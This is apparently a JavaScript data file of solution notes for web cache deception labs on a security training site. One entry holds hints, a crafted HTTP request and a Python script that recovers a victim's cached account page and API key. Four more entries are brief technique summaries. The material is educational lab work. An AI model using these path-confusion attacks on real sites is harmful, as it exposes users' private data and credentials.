export default {
  'cache-deception-lab-wcd-exploiting-path-mapping': {
    note: 'Append a static-looking suffix to `/my-account`; the cache stores the victim\'s page under that public URL.',
    work: {
      hints: [
        'Find the private page that contains an API key (`/my-account`). Then find a static file path the cache stores.',
        'The origin routes on the path prefix; the cache decides cacheability from the suffix. Combine them.',
        'Send the victim `/my-account/abc.js`, then request the same URL without a session and read the cached API key.'
      ],
      approach:
        'Path confusion between the cache and the origin. The origin ignores the extra segment and serves the account page; the cache sees a `.js` URL and stores the response. The attacker later fetches the cached copy.',
      request: `GET /my-account/abc.js HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: victim-session
Connection: close`,
      tokens: [
        ['/my-account', 'The dynamic route. The framework matches the prefix and returns private data.'],
        ['/abc.js', 'An extra segment the origin ignores but the cache uses to classify the response as a static asset.'],
        ['Cookie: victim-session', 'The victim must be authenticated when the response is generated; the cache then stores the personalised body.'],
        ['(second request)', 'The attacker requests the same URL without a session and receives the cached private page.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
url = f"{base}/my-account/abc.js"
print("Send this to the victim:", url)
input("Press Enter after the victim has visited it...")
r = requests.get(url, timeout=20)   # no session cookie
print(r.status_code)
print("API Key" in r.text and "cached account page recovered" or r.text[:200])`
    }
  },
  'cache-deception-lab-wcd-exploiting-path-delimiters': {
    note: 'A delimiter (`;`, `?`, or encoded `#`) is ignored by the origin but splits the cache key, exposing the private route.'
  },
  'cache-deception-lab-wcd-exploiting-origin-server-normalization': {
    note: 'The origin normalises dot segments; the cache keys the raw path, so an encoded traversal maps to a cacheable URL.'
  },
  'cache-deception-lab-wcd-exploiting-cache-server-normalization': {
    note: 'The cache normalises the path; the origin does not, letting a normalised key retrieve a private response.'
  },
  'cache-deception-lab-wcd-exploiting-exact-match-cache-rules': {
    note: 'The cache only stores `.js`/`.css`; craft a path that satisfies the rule while the origin still serves the account route.'
  }
}
